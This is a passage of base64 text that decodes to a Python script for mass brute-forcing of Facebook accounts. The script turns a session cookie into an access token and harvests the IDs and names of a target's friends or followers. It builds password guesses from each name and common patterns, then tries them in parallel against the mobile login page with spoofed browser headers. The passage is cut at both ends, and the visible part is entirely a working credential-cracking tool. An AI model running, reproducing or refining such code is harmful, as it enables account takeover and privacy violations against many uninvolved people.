R5cGUnCgkJCQkpCgkJCQlzZXMuaGVhZGVycy5wb3AoCgkJCQkJJ29yaWdpbicKCQkJCSkKCQkJCXNlcy5oZWFkZXJzLnVwZGF0ZSgKCQkJCQl7CgkJCQkJCSdyZWZlcmVyJzogJ2h0dHBzOi8vbS5mYWNlYm9vay5jb20vJywKCQkJCQl9CgkJCQkpCgkJCQlyZXNwb25zZTYgPSBzZXMuZ2V0KHdpbmRvd3NfcmVmZXJlciwgY29va2llcyA9IHsnY29va2llJzogY29rfSkudGV4dAoJCQkJaWYgJ1N1a3NlcyEnIGluIHN0cihyZXNwb25zZTYpOgoJCQkJCXNlcy5oZWFkZXJzLnVwZGF0ZSgKCQkJCQkJewoJCQkJCQkJJ3NlYy1mZXRjaC1tb2RlJzogJ25vLWNvcnMnLAoJCQkJCQkJJ3JlZmVyZXInOiAnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJywKCQkJCQkJCSdIb3N0JzogJ2dyYXBoLmZhY2Vib29rLmNvbScsCgkJCQkJCQknYWNjZXB0JzogJyovKicsCgkJCQkJCQknc2VjLWZldGNoLWRlc3QnOiAnc2NyaXB0JywKCQkJCQkJCSdzZWMtZmV0Y2gtc2l0ZSc6ICdjcm9zcy1zaXRlJywKCQkJCQkJfQoJCQkJCSkKCQkJCQlyZXNwb25zZTcgPSBzZXMuZ2V0KHN0YXR1c191cmwsIGNvb2tpZXMgPSB7J2Nvb2tpZSc6IGNva30pLnRleHQKCQkJCQl0b2sgPSByZS5zZWFyY2goJyJhY2Nlc3NfdG9rZW4iOiAiKC4qPykiJywgc3RyKHJlc3BvbnNlNykpLmdyb3VwKDEpCgkJCQkJdG9rZW53ID0gb3BlbigiLnRva2VuLnR4dCIsICJ3Iikud3JpdGUodG9rKQoJCQkJCWNva2lldyA9IG9wZW4oIi5jb2sudHh0IiwgInciKS53cml0ZShjb2spCgkJCQkJcHJpbnQoZidcblshXSDYqtmFINiq2LPYrNmK2YQg2KfZhNmD2YjZg9mK2LIg2Kgg2YbYrdin2K0g2KfYrtix2Kwg2YjYp9iv2K7ZhCAuLi4u4pyTJykKCQkJCWVsc2U6CgkJCQkJZXhpdCgnXG5bK10gbG9naW4gWCcpCgkJCglleGNlcHQgRXhjZXB0aW9uIGFzIGU6CgkJcHJpbnQoJ1xuWyFdINmD2YjZg9mK2LIg2LrZitixINi12KfZhNitLi4uWCcpCgkJb3Muc3lzdGVtKCdybSAtcmYgLmNvay50eHQgJiYgcm0gLXJmIC50b2tlbi50eHQnKQoJCXByaW50KGUpCgkJZXhpdCgpCglleGNlcHQ6cGFzcwoKTCA9ICJcMDMzWzE7OTVtIiAgI9in2LHYrNmI2KfZhtmKCiMgCgpkZWYgbWVudShteV9uYW1lLG15X2lkKToKCWlwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKS50ZXh0CgkKCW9zLnN5c3RlbSgnY2xlYXInKQoJYmFubmVyKCkKCQoJcHJpbnQoJycpCglwcmludChGKyfjgI7wnZCY8J2QgPCdkJLwnZCI8J2QkeOAj+KHo/Cfh67wn4e2IHwg8J2fr0snKQoJI3ByaW50KCdbQlkgPSBAVFRMOVRdJykKCSNwcmludChmJ8K7ICBZb3VyIElEIDogJytzdHIobXlfaWQpKQojCXByaW50KGYnwrsgIFlvdXIgSVAgOiB7aXB9JykKCXByaW50KEwrJz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykKCXByaW50KCfCuyAxLSBGaXNoaW5nIGZyb20gZnJpZW5kcyA6INi12YrYryDZhdmGINin2YTYp9i12K/Zgtin2KEgICcpCglwcmludChMKyc9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpCgkjcHJpbnQoJ8K7IDItIEZpc2hpbmcgZnJvbSBmb2xsb3dlcnMgOiDZhdmGINin2YTZhdiq2KfYqNi52YrZhiAnKQoJI3ByaW50KCcuJykKCXByaW50KCfCuyAyLSBDcmFjayBGaWxlIDog2YXZgNmA2YYg2YXZgNmA2YTZgNmA2YEgICcpCglwcmludChMKyc9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScpCQkKCXByaW50KCfCuyAwLSBsb2dpbiBvdXQgOiDYqti62YrYsSDYp9mE2YPZiNmD2YrYsicpCglwcmludChMICsgJz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykKCQkKCV9fX19fYWx2aW5vX19hZGlqYXlhX19fX18gPSBpbnB1dCgnXG5bPV0gY2hvc2UgOiAnKQoJaWYgX19fX19hbHZpbm9fX2FkaWpheWFfX19fXyBpbiBbJzEnXToKCQlkdW1wX21hc3NhbCgpCgllbGlmIF9fX19fYWx2aW5vX19hZGlqYXlhX19fX18gaW4gWyczJ106CgkJZm9sbG93ZXIoKQkKCWVsaWYgX19fX19hbHZpbm9fX2FkaWpheWFfX19fXyBpbiBbJzInXToKCQlUYWtlRmlsZSgpCQoJZWxpZiBfX19fX2Fsdmlub19fYWRpamF5YV9fX19fIGluIFsnMCddOgoJCU8oKQoJCWV4aXQoKQoKZGVmIGZvbGxvd2VyKCk6Cgl0cnk6CgkJdG9rZW4gPSBvcGVuKCcudG9rZW4udHh0JywncicpLnJlYWQoKQoJCWNvayA9IG9wZW4oJy5jb2sudHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJZXhpdCgpCgl0cnk6CgkJanVtID0gaW50KGlucHV0KCdbPj5dIENSQUNLIElEIExJTUlUIDog2KfZg9iq2Kgg2LnYr9ivINin2YTYp9mK2K/Zitin2KogJykpCglleGNlcHQgVmFsdWVFcnJvcjoKCQlwcmludCgne2t9W+Kcll0gTk9UIFBVQkxJQyBJRCAnKQoJCXRpbWUuc2xlZXAoMykKCQlmb2xsb3dlcigpCglpZiBqdW08MToKCQlwcmludCgnW+Kcll0gWW91ciBsaW1pdCBlcnJvcicpCgkJdGltZS5zbGVlcCgzKQoJCWZvbGxvd2VyKCkKCXNlcz1yZXF1ZXN0cy5TZXNzaW9uKCkKCXl6ID0gMAoJZm9yIG1ldCBpbiByYW5nZShqdW0pOgoJCXl6Kz0xCQkKCQlrbCA9IGlucHV0KCdbKl0gSUQgPj4gJytzdHIoeXopKycgOiAnKQoJCXVpZC5hcHBlbmQoa2wpCglmb3IgdXNlcnIgaW4gdWlkOgoJCXRyeToKCQkJa29oMiA9IHNlcy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcnIrJz9maWVsZHM9c3Vic2NyaWJlcnMubGltaXQoOTk5OTkpJmFjY2Vzc190b2tlbj0nK3Rva2Vua3VbMF0sY29va2llcz17J2Nvb2tpZSc6IGNva30pLmpzb24oKQoJCQlmb3IgcGkgaW4ga29oMlsnc3Vic2NyaWJlcnMnXVsnZGF0YSddOgoJCQkJdHJ5OmlkLmFwcGVuZChwaVsnaWQnXSsnfCcrcGlbJ25hbWUnXSkKCQkJCWV4Y2VwdDpjb250aW51ZQoJCQlwcmludCgnWz4+XSBUb3RhbCBJZCA6ICcrc3RyKGxlbihpZCkpKQoJCQlzZXR0aW5nKCkKCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJCXByaW50KCdb4pyWXSBObyBDb25uZWN0aW9uICAnKQoJCQlleGl0KCkKCQlleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgoJCQlwcmludCgnW+KcmF0gSWQgSXMgTm90IFB1YmxpYycpCgkJCXRpbWUuc2xlZXAoMykKCQkJZm9sbG93ZXIoKQoKZGVmIFRha2VGaWxlKCk6Cgl0cnk6CgkJdG9rZW4gPSBvcGVuKCcudG9rZW4udHh0JywncicpLnJlYWQoKQoJCWNvayA9IG9wZW4oJy5jb2sudHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJZXhpdCgpCgl0cnk6CgkJCgkJanVtID0gaW5wdXQoJ1s/XSBJTlBVVCBGSUxFIDogJykKCQlmb3IgbGluZSBpbiBvcGVuKGp1bSwgJ3InKS5yZWFkbGluZXMoKToKCQkJaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkKCQlwcmludCgnW+KAol0gVG90YWwgSWQgOiAnK3N0cihsZW4oaWQpKSkKCQlzZXR0aW5nKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQkJcHJpbnQoJ1vinJhdIE5vIENvbm5lY3Rpb24gICcpCgkJCWV4aXQoKQoJZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToKCQkJcHJpbnQoJ1vinJhdIElkIElzIE5vdCBQdWJsaWMnKQoJCQl0aW1lLnNsZWVwKDMpCgkJCWZvbGxvd2VyKCkKCmRlZiBkdW1wX21hc3NhbCgpOgoJdHJ5OgoJCXRva2VuID0gb3BlbignLnRva2VuLnR4dCcsJ3InKS5yZWFkKCkKCQljb2sgPSBvcGVuKCcuY29rLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCWV4aXQoKQoJdHJ5OgoJCWp1bSA9IGludChpbnB1dCgnPj4gTUFOWSBJRCA6ICcpKQoJZXhjZXB0IFZhbHVlRXJyb3I6CgkJcHJpbnQoJz4+IE1hc3Vra2FuIEFuZ2thIEFuamluZywgTWFsYWggSHVydWZmICcpCgkJZXhpdCgpCglpZiBqdW08MSBvciBqdW0+MTAwOgoJCXByaW50KCc+PiBHYWdhbCBEdW1wIElkeiAnKQoJCWV4aXQoKQoJc2VzPXJlcXVlc3RzLlNlc3Npb24oKQoJeXogPSAwCglmb3IgbWV0IGluIHJhbmdlKGp1bSk6CgkJeXorPTEKCQlrbCA9IGlucHV0KCc+PiBJRCAnK3N0cih5eikrJyA6ICcpCgkJdWlkLmFwcGVuZChrbCkKCWZvciB1c2VyIGluIHVpZDoKCSAgICB0cnk6CgkgICAgICAgaGVhZCA9ICgKCSAgICAgICB7InVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTE1LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IgoJICAgICAgIH0pCgkgICAgICAgaWYgbGVuKGlkKSA9PSAwOgoJICAgICAgICAgICBwYXJhbXMgPSAoCgkgICAgICAgICAgIHsKCSAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IHRva2VuLAoJICAgICAgICAgICAnZmllbGRzJzogImZyaWVuZHMiCgkgICAgICAgICAgIH0JICAgICAgICAgIAoJICAgICAgICkKCSAgICAgICBlbHNlOgoJICAgICAgICAgICBwYXJhbXMgPSAoCgkgICAgICAgICAgIHsKCSAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IHRva2VuLAoJICAgICAgICAgICAnZmllbGRzJzogImZyaWVuZHMiCgkgICAgICAgICAgIH0JICAgICAgICAgICAKCSAgICAgICApCgkgICAgICAgdXJsID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97fScuZm9ybWF0KHVzZXIpLHBhcmFtcz1wYXJhbXMsaGVhZGVycz1oZWFkLGNvb2tpZXM9eydjb29raWVzJzpjb2t9KS5qc29uKCkKCSAgICAgICBmb3IgeHIgaW4gdXJsWydmcmllbmRzJ11bJ2RhdGEnXToKCSAgICAgICAgICAgdHJ5OgoJICAgICAgICAgICAgICAgd295ID0gKHhyWydpZCddKyd8Jyt4clsnbmFtZSddKQoJICAgICAgICAgICAgICAgaWYgd295IGluIGlkOnBhc3MKCSAgICAgICAgICAgICAgIGVsc2U6aWQuYXBwZW5kKHdveSkKCSAgICAgICAgICAgZXhjZXB0OmNvbnRpbnVlCgkgICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToKCSAgICAgIHBhc3MKCSAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkgICAgICAgIGV4aXQoKQoJdHJ5OgoJCXByaW50KCcnKQoJCXByaW50KGYnwrsgSUQgfCDYudiv2K8g2KfZhNin2YrYr9mK2KfYqiB7aH0nK3N0cihsZW4oaWQpKSkKCQlzZXR0aW5nKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludChmJ3t4fScpCgkJcHJpbnQoJz4+IFNpbnlhbCBMb2ggS3VyYW5nIEJhZ3VzICcpCgkJYmFjaygpCglleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgoJCXByaW50KGYnPj57a30gUGVydGVtYW5hbiBUaWRhayBQdWJsaWMge3h9JykKCQl0aW1lLnNsZWVwKDMpCgkJYmFjaygpCgpkZWYgc2V0dGluZygpOgoJcHJpbnQoTCArICfinK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK4nKQoJcHJpbnQoJ1wwMzNbMTszM20g4p6ZIFsgMSBd4p6ZTUlYIC0gSUQnKQoJcHJpbnQoTCArICfinK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK4nKQoJcHJpbnQoJycpCglodSA9IGlucHV0KCfCuyBDaG9zZSA6ICcpCglpZiBodSBpbiBbJzMnLCcwMyddOgoJCWZvciB0dWEgaW4gc29ydGVkKGlkKToKCQkJaWQyLmFwcGVuZCh0dWEpCgoJZWxpZiBodSBpbiBbJzInLCcwMiddOgoJCW11ZGE9W10KCQlmb3IgYmFjb3QgaW4gc29ydGVkKGlkKToKCQkJbXVkYS5hcHBlbmQoYmFjb3QpCgkJYmNtPWxlbihtdWRhKQoJCWJjbWk9KGJjbS0xKQoJCWZvciB4bXVkIGluIHJhbmdlKGJjbSk6CgkJCWlkMi5hcHBlbmQobXVkYVtiY21pXSkKCQkJYmNtaSAtPTEKCWVsaWYgaHUgaW4gWycxJywnMDEnXToKCQlmb3IgYmFjb3QgaW4gaWQ6CgkJCXh4ID0gcmFuZG9tLnJhbmRpbnQoMCxsZW4oaWQyKSkKCQkJaWQyLmluc2VydCh4eCxiYWNvdCkKCWVsc2U6CgkJcHJpbnQoJz4+IFBJTElIIFlBTkcgQkVOQVIgQkFORyAnKQoJCWV4aXQoKQoJcHJpbnQoTCArICfinK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK7inK4nKQoJcHJpbnQoTCsgJ1wwMzNbMTszM21bIDEgXSDinpkgU0hPVyBDUCAnKQojICAgIHByaW50KCc+PiAyLiBNYmFzaWMgJykKIyAgICBwcmludCgnPj4gMy4gVG91Y2ggICcpCiMgICAgcHJpbnQoJz4+IDQuIE10b3VjaCAnKQoJcHJpbnQoJycpCgloYyA9IGlucHV0KCfCuyBDaG9zZSA6ICcpCglpZiBoYyBpbiBbJzEnLCcwMSddOgoJCW1ldGhvZC5hcHBlbmQoJ21vYmlsZScpCgllbGlmIGhjIGluIFsnJ106CgkJcHJpbnQoJz4+IFBJTElIIFlBTkcgQkVOQVIgQkFORyAnKQoJCXNldHRpbmcoKQojCWVsaWYgaGMgaW4gWycyJywnMDInXToKIwkJbWV0aG9kLmFwcGVuZCgnZnJlZScpCiMJZWxpZiBoYyBpbiBbJzMnLCcwMyddOgojCQltZXRob2QuYXBwZW5kKCd0b3VjaCcpCgllbGlmIGhjIGluIFsnNCcsJzA0J106CgkJbWV0aG9kLmFwcGVuZCgnbWJhc2ljJykKCWVsc2U6CgkJbWV0aG9kLmFwcGVuZCgnbW9iaWxlJykKCXByaW50KEwgKyAn4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyuJykKCXByaW50KCdcMDMzWzE7MzNt4p6ZWyAxIF0g4p6ZU2hvdyBjb29raWVzIC0g2KfYuNmH2KfYsSDYp9mE2YPZiNmD2YrYsicpCglfamVtYm90XyA9IGlucHV0KCdcMDMzWzE7MzNt4p6ZIENob29zZSA6JykKCWlmIF9qZW1ib3RfIGluIFsnJ106CgkJcHJpbnQoJz4+IFBpbGloIFlhbmcgQmVuZXIgS29udG9sICcpCgkJYmFjaygpCgllbGlmIF9qZW1ib3RfIGluIFsnMScsJzEnXToKCQl0YXBsaWthc2kuYXBwZW5kKCd5YScpCgllbHNlOgoJCXRhcGxpa2FzaS5hcHBlbmQoJ25vJykKCXByaW50KEwgKyAn4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyu4pyuJykKCXByaW50KCfinplcMDMzWzE7MzNtWyAxIF3inplQYXNzd29yZCByYW5kb20gLSDYqNin2LPZiNix2K8g2YXZhiDYp9mE2KfYr9in2KknKQoJcHdwbHVzPWlucHV0KCdcMDMzWzE7MzNt4p6ZIENob29zZSA6JykKCWlmIHB3cGx1cyBpbiBbJzInLCcyJ106CgkJcHdwbHVzcy5hcHBlbmQoJ3lhJykKCQljZXRhayhuZWwoJ1tbY3lhbl3igKJbd2hpdGVdXSBNYXN1a2thbiBLYXRhc2FuZGkgVGFtYmFoYW4gTWluaW1hbCA2IEthcmFrdGVyXG5bW2N5YW5d4oCiW3doaXRlXV0gQ29udG9oIDpbZ3JlZW5dIGtha2FrLG5nZW50b2QsYWRpa1t3aGl0ZV0gJykpCgkJcHdrdT1pbnB1dCgnPj4gTWFzdWtrYW4gUGFzc3dvcmQgVGFtYmFoYW4gOiAnKQoJCXB3a3VoPXB3a3Uuc3BsaXQoJywnKQoJCWZvciB4cHcgaW4gcHdrdWg6CgkJCXB3bnlhLmFwcGVuZCh4cHcpCgllbHNlOgoJCXB3cGx1c3MuYXBwZW5kKCdubycpCglwYXNzd3JkKCkgCmRlZiBwYXNzd3JkKCk6CgkKCQoJd2l0aCB0cmVkKG1heF93b3JrZXJzPTMwKSBhcyBwb29sOgoJCWZvciB5dXpvbmcgaW4gaWQyOgoJCQlpZGYsbm1mID0geXV6b25nLnNwbGl0KCd8JylbMF0seXV6b25nLnNwbGl0KCd8JylbMV0ubG93ZXIoKQoJCQlmcnMgPSBubWYuc3BsaXQoJyAnKVswXQoJCQlwd3YgPSBbXQoJCQlpZiBsZW4obm1mKTw2OgoJCQkJaWYgbGVuKGZycyk8MzoKCQkJCQlwYXNzCgkJCQllbHNlOgoJCQkJCXB3di5hcHBlbmQobm1mKQoJCQkJCXB3di5hcHBlbmQoZnJzK2ZycykKCQkJCQlwd3YuYXBwZW5kKGZycysnICcrZnJzKQoJCQkJCXB3di5hcHBlbmQoJ9mh2aLZo9mk2aXZpicpCgkJCQkJcHd2LmFwcGVuZCgn2aHZotmj2aTZpdmm2afZqNmpJykKCQkJCQlwd3YuYXBwZW5kKCcxMTIyMzM0NDU1QEAnKQoJCQkJCXB3di5hcHBlbmQoJ0FhMTIzNDU2JykKCQkJCQlwd3YuYXBwZW5kKCdtbW1tbm5ubicpCgkJCQkJcHd2LmFwcGVuZCgnbm5ubm1tbW0nKQoJCQkJCXB3di5hcHBlbmQoJ21tbm5iYnZ2JykKCQkJCQlwd3YuYXBwZW5kKCd6enp6eHh4eCcpCgkJCQkJcHd2LmFwcGVuZCgnenp4eGNjdnYnKQoJCQkJCXB3di5hcHBlbmQoJ3Fxd3dlZXJyJykKCQkJCQlwd3YuYXBwZW5kKCcxMjM0NUAxMjM0NScpCgkJCQkJcHd2LmFwcGVuZCgnMTIzQDEyMycpCgkJCQkJcHd2LmFwcGVuZCgnMTIzNDUxMjM0NScpCgkJCQkJcHd2LmFwcGVuZCgnMTIzNDEyMzQ1JykKCQkJCQlwd3YuYXBwZW5kKCcxMjM0NTU0MzIxJykKCQkJCQlwd3YuYXBwZW5kKCcwMDk5ODg3NycpCgkJCQkJcHd2LmFwcGVuZCgnMTIzNDU2MTIzNDU2JykKCQkJCQlwd3YuYXBwZW5kKCcxMTIyMzM0NDU1JykKCQkJCQlwd3YuYXBwZW5kKCcxcTJ3M2U0cjV0JykKCQkJCQlwd3YuYXBwZW5kKCcxcTJ3M2U0cjV0NnknKQoJCQkJCXB3di5hcHBlbmQoJzIwMjAyMDIwJykKCQkJCQlwd3YuYXBwZW5kKCcyMDIyMjAyMicpCgkJCQkJcHd2LmFwcGVuZCgnYWFzc2RkZmYnKQoJCQllbHNlOgoJCQkJaWYgbGVuKGZycyk8MzoKCQkJCQlwd3YuYXBwZW5kKG5tZikKCQkJCWVsc2U6CgkJCQkJcHd2LmFwcGVuZChubWYpCgkJCQkJcHd2LmFwcGVuZChmcnMrZnJzKQoJCQkJCXB3di5hcHBlbmQoZnJzKycgJytmcnMpCgkJCQkJcHd2LmFwcGVuZCgn2aHZotmj2aTZpdmmJykKCQkJCQlwd3YuYXBwZW5kKCfZodmi2aPZpNml2abZp9mo2aknKQoJCQkJCXB3di5hcHBlbmQoJzExMjIzMzQ0NTVAQCcpCgkJCQkJcHd2LmFwcGVuZCgnQWExMjM0NTYnKQoJCQkJCXB3di5hcHBlbmQoJ21tbW1ubm5uJykKCQkJCQlwd3YuYXBwZW5kKCdubm5ubW1tbScpCgkJCQkJcHd2LmFwcGVuZCgnbW1ubmJidnYnKQoJCQkJCXB3di5hcHBlbmQoJ3p6enp4eHh4JykKCQkJCQlwd3YuYXBwZW5kKCd6enh4Y2N2dicpCgkJCQkJcHd2LmFwcGVuZCgncXF3d2VlcnInKQoJCQkJCXB3di5hcHBlbmQoJzEyMzQ1QDEyMzQ1JykKCQkJCQlwd3YuYXBwZW5kKCcxMjNAMTIzJykKCQkJCQlwd3YuYXBwZW5kKCcxMjM0NTEyMzQ1JykKCQkJCQlwd3YuYXBwZW5kKCcxMjM0MTIzNDUnKQoJCQkJCXB3di5hcHBlbmQoJzEyMzQ1NTQzMjEnKQoJCQkJCXB3di5hcHBlbmQoJzAwOTk4ODc3JykKCQkJCQlwd3YuYXBwZW5kKCcxMjM0NTYxMjM0NTYnKQoJCQkJCXB3di5hcHBlbmQoJzExMjIzMzQ0NTUnKQoJCQkJCXB3di5hcHBlbmQoJzFxMnczZTRyNXQnKQoJCQkJCXB3di5hcHBlbmQoJzFxMnczZTRyNXQ2eScpCgkJCQkJcHd2LmFwcGVuZCgnMjAyMDIwMjAnKQoJCQkJCXB3di5hcHBlbmQoJzIwMjIyMDIyJykKCQkJCQlwd3YuYXBwZW5kKCdhYXNzZGRmZicpCgkJCWlmICd5YScgaW4gcHdwbHVzczoKCQkJCWZvciB4cHdkIGluIHB3bnlhOgoJCQkJCXB3di5hcHBlbmQoeHB3ZCkKCQkJZWxzZTpwYXNzCgkJCWlmICdtb2JpbGUnIGluIG1ldGhvZDoKCQkJCXBvb2wuc3VibWl0KGNyYWNrLGlkZixwd3YpCgkJCWVsaWYgJ2ZyZWUnIGluIG1ldGhvZDoKCQkJCXBvb2wuc3VibWl0KGNyYWNrZnJlZSxpZGYscHd2KQoJCQllbGlmICd0b3VjaCcgaW4gbWV0aG9kOgoJCQkJcG9vbC5zdWJtaXQoY3JhY2t0b3VjaCxpZGYscHd2KQoJCQllbGlmICdtYmFzaWMnIGluIG1ldGhvZDoKCQkJCXBvb2wuc3VibWl0KGNyYWNrbWJhc2ljLGlkZixwd3YpCgkJCWVsc2U6CgkJCQlwb29sLnN1Ym1pdChjcmFja21iYXNpYyxpZGYscHd2KQoJcHJpbnQoJycpCgljZXRhayhuZWwoJ1x0W2N5YW5d4pyTW2dyZWVuXSBDcmFjayBTZWxlc2FpIE5nYWIsIEphbmdhbiBMdXBhIEJlcnN5dWt1cltjeWFuXSDinJNbd2hpdGVdICcpKQoJcHJpbnQoZidbe2J94oCie3h9XXtofSBPSyA6IHtofSVzICclKG9rKSkKCXByaW50KGYne3h9W3tifeKAont4fV17a30gQ1AgOiB7a30lc3t4fSAnJShjcCkpCglwcmludCgnJykKCXByaW50KCc+PiBMYW5qdXQgQ3JhY2sgS2VtYmFsaSAoIFkvdCApID8gJykKCXdvaSA9IGlucHV0KCc+PiBQaWxpaCA6ICcpCglpZiB3b2kgaW4gWyd5JywnWSddOgoJCWJhY2soKQoJZWxzZToKCQlwcmludChmJ1x0e3h9Wz1de2t9IEJlZW4gY29tcGxldGVkIHt4fSA8PiAnKQoJCXRpbWUuc2xlZXAoMikKCQlleGl0KCkKCgpkZWYgY3JhY2soaWRmLHB3dik6CglnbG9iYWwgbG9vcCxvayxjcAoJYmkgPSByYW5kb20uY2hvaWNlKFt1LGssa2ssYixoLGhoXSkKCXBlcnMgPSBsb29wKjEwMC9sZW4oaWQyKQoJZmZmID0gJyUnCglwcmludCgnXHIlc3tcMDMzWzE7MzNtIFvwnZCY8J2QgPCdkJLwnZCI8J2QkfCfnKddICVzLyVzIOKemSBcMDMzWzE7OTVtWyBb8J2Qk/CdkJHwnZCU8J2QhF1dICVzIOKemVwwMzNbMTszMW0gWyBb8J2QgfCdkIvwnZCO8J2QgvCdkIpdXSAlcyAuLiB9ICVzJXMlcyclKGJpLGxvb3AsbGVuKGlkMiksb2ssY3AsaW50KHBlcnMpLHN0cihmZmYpLHgpLCBlbmQ9JyAnKTtzeXMuc3Rkb3V0LmZsdXNoKCkKCXVhID0gcmFuZG9tLmNob2ljZSh1Z2VuKQoJdWEyID0gcmFuZG9tLmNob2ljZSh1Z2VuMikKCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQoJZm9yIHB3IGluIHB3djoKCQl0cnk6CgkJCXRpeCA9IHRpbWUudGltZSgpCgkJCXNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOidtLmZhY2Vib29rLmNvbScsInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwidXNlci1hZ2VudCI6dWEyLCJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqW2luc2VydGVkIGJ5IGN5dGhvbiB0byBhdm9pZCBjb21tZW50IGNsb3Nlcl0vW2luc2VydGVkIGJ5IGN5dGhvbiB0byBhdm9pZCBjb21tZW50IHN0YXJ0XSo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJkbnQiOiIxIiwieC1yZXF1ZXN0ZWQtd2l0aCI6Im1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsInNlYy1mZXRjaC11c2VyIjoiZW1wdHkiLCJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwicmVmZXJlciI6Imh0dHBzOi8vbS5mYWNlYm9vay5jb20vIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSBiciIsImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44In0pCgkJCXAgPSBzZXMuZ2V0KCdodHRwczovL20uZmFjZWJvb2suY29tL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYnKS50ZXh0CgkJCWRhdGFhID17ImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIocCkpLmdyb3VwKDEpLCJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIocCkpLmdyb3VwKDEpLCJ1aWQiOmlkZiwiZmxvdyI6ImxvZ2luX25vX3BpbiIsInBhc3MiOnB3LCJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8ifQoJCQlzZXMuaGVhZGVycy51cGRhdGUoeyJIb3N0IjonbS5mYWNlYm9vay5jb20nLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL20uZmFjZWJvb2suY29tIiwiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCpbaW5zZXJ0ZWQgYnkgY3l0aG9uIHRvIGF2b2lkIGNvbW1lbnQgY2xvc2VyXS9baW5zZXJ0ZWQgYnkgY3l0aG9uIHRvIGF2b2lkIGNvbW1lbnQgc3RhcnRdKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vc